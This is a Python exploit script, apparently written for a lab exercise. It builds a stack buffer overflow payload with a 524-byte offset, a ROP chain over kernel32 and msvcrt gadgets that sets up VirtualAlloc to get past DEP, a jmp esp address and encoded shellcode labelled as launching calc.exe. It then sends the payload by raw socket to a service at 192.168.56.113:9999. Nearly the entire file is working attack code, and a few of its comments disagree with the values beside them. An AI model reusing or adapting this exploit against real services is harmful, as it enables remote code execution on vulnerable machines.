import struct

class OffsetPacker:
    def __init__(self, base):
        self.base = base
    
    def __call__(self, offset):
        return struct.pack('<I', self.base + offset)

# Создаю упаковщики для разных модулей
# Указываю Base Address
kernel32_p32 = OffsetPacker(base=0x76ED0000)
msvcrt_p32 = OffsetPacker(base=0x754D0000)
ws2_32_p32 = OffsetPacker(base=0x776E0000)

# Обычная упаковка
def p32(x): return struct.pack('<I', x)

# Базовые константы
OFFSET = 524
ADDR_VA = kernel32_p32(0x137C0)       # offset для VirtualAlloc
ADDR_JMP_ESP = 0x311712F3             # Адрес jmp esp для выполнения кода в стеке
ROP_NOP = 0x3117124c                  # ret


# Шеллкод для запуска calc.exe (пример)
shellcode = b'\x90' * 16 + \
b'\xdb\xc3\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x33\xba\xa5' \
b'\x0b\x9e\x3b\x31\x53\x18\x83\xc3\x04\x03\x53\xb0\x2b' \
b'\x4d\xd6\x20\x2e\xae\x27\xb1\x4f\x26\xc2\x80\x5f\x3c' \
b'\x86\xb2\x6f\x36\xca\x3e\x1b\x1a\xff\xb5\x69\xb3\xf0' \
b'\x7e\xc7\xe5\x3f\x7f\x64\x09\x21\x03\x77\x5e\x81\x3a' \
b'\xb8\x93\x40\x7b\xa5\x5e\x10\xd4\xa1\xcd\x85\x51\xff' \
b'\xcd\x2e\x29\x11\x56\xd2\xf9\x10\x77\x45\x72\x4b\x57' \
b'\x67\x57\xe7\xde\x7f\xb4\xc2\xa9\x0c\x0e\xb8\x28\xc4' \
b'\x5f\x41\x86\x29\x50\xb0\xd6\x6e\x47\x2b\xad\x86\xa4'


#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Remember (1) the  stack  grows  downwards  so we  need to load the  #
# values into the registers in reverse order! (2) We are going to do  #
# some clever  trickery to  align our  return after  executing.  To   #
# acchieve this we will be filling EDI with a ROP-Nop and we will be  #
# skipping ESP leaving it intact.                                     #
#                                                                     #
# EAX 90909090 => Nop                                                 #
# ECX 00000040 => flProtect                                           #
# EDX 00001000 => flAllocationType                                    #
# EBX 00000001 => dwSize                                              #
# ESP ???????? => Leave as is                                         #
# EBP ???????? => Call to ESP (jmp, call, push,..)                    #
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of ADDR_VA          #
# EDI 3117124C => ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#

# EAX rop
eax = kernel32_p32(0x18FAF)        # pop eax ; ret
eax += p32(0x90909090)             # EAX 90909090 => Nop

# ECX rop
ecx = kernel32_p32(0x17130)        # xor eax, eax ; ret => 0x00000000
ecx += msvcrt_p32(0x7f713)         # add eax, 0x60 ; ret
ecx += msvcrt_p32(0x6c061)         # add eax, -0x20 ; pop ebp ; ret
ecx += p32(0x42424242)             # EBP 42424242 => padding for pop ebp
ecx += msvcrt_p32(0x73634)         # xchg eax, ecx ; ret => перенос eax в ecx

# EDX rop
edx = kernel32_p32(0x18FAF)        # pop eax ; ret
edx += p32(0xE58BEFFE)             # Bitwise Calc => E58BEFFE
edx += msvcrt_p32(0x270d3)         # xor eax, 0xe58bfffe ; pop ebp ; ret => EAX 0x00001000
edx += p32(0x44444444)             # EBP 43434343 => padding for pop ebp
edx += kernel32_p32(0x3a323)       # xchg eax, edx ; ret => перенос eax в edx

# EBX rop
ebx = kernel32_p32(0x18FAF)        # pop eax ; ret
ebx += p32(0xE58BFFFF)             # Bitwise Calc => E58BFFFF
ebx += msvcrt_p32(0x270d3)         # xor eax, 0xe58bfffe ; pop ebp ; ret => EAX 0x00001000
ebx += p32(0x43434343)             # EBP 43434343 => padding for pop ebp
ebx += msvcrt_p32(0xaa226)         # xchg eax, ebx ; ret => перенос eax в ebx

#ebx = p32(0x311712f8)              # pop ebx ; ret
#ebx += p32(0xffffffff)             # EBX FFFFFFFF
#ebx += msvcrt_p32(0x270d3)         # inc ebx ; ret => EBX 0x00000000
#ebx += msvcrt_p32(0x270d3)         # inc ebx ; ret => EBX 0x00000001

# EBP rop
ebp = p32(0x311712fa)              # pop ebp ; ret
ebp += p32(ADDR_JMP_ESP)           # EBP 311712F3

# ESI rop
esi = kernel32_p32(0x18FAF)        # pop eax ; ret
esi += ADDR_VA                     # EAX ???137C0
esi += kernel32_p32(0x5a3db)       # mov eax, dword ptr [eax] ; ret
esi += msvcrt_p32(0x4b8f2)         # xchg eax, edi ; ret
esi += msvcrt_p32(0x0bfb6)         # mov esi, edi ; ret

# ws2_32_p32


# rop combine
rop = ecx + edx + ebx + ebp + esi + eax

# Адреса гаджетов
#pop_eax = kernel32_p32(0x00018FAF)  # -> p32(0x6B818FAF)      # pop eax; ret
#xor_eax = kernel32_p32(0x00017130)      # xor eax, eax; ret
#mov_ecx_eax = kernel32_p32(0x00019660)  # mov ecx, eax; mov eax, ecx; pop ebp; ret
#push_ecx = kernel32_p32(0x00027a37)     # push ecx; ret

payload = b'A' * OFFSET             # buf fill 520 + EBP затирание 4 байт в 32
payload += rop                      # Setting Registers For VirtualAlloc
payload += ADDR_VA                  # EIP → VirtualAlloc
payload += b'CCCC'                  # Temp Stack Data 4 test only

#payload += lpAddress_chain                           # Устанавливаем lpAddress = 0
#payload += p32(0x772C37C0) #addr_VA                  #EIP → VirtualAlloc
#payload += p32(0x311712F3) #addr_jmp_esp             # return address (jmp esp)
#payload += lpAddress                # lpAddress
#payload += dwSize                   # dwSize 1000
#payload += flAllocationType         # flAllocationType
#payload += flProtect                #flProtect
##print(payload)
#payload += shellcode

# Проверки:
badchars = [b'\x00', b'\x0a', b'\x0d', b'\x09']
assert len(payload) <= 1000
assert not any(bad in payload for bad in badchars), \
       f'Payload contains one of badchars: {badchars!r}'


# Отправка
import socket
s = socket.create_connection(('192.168.56.113', 9999))
s.send(payload)
s.close()
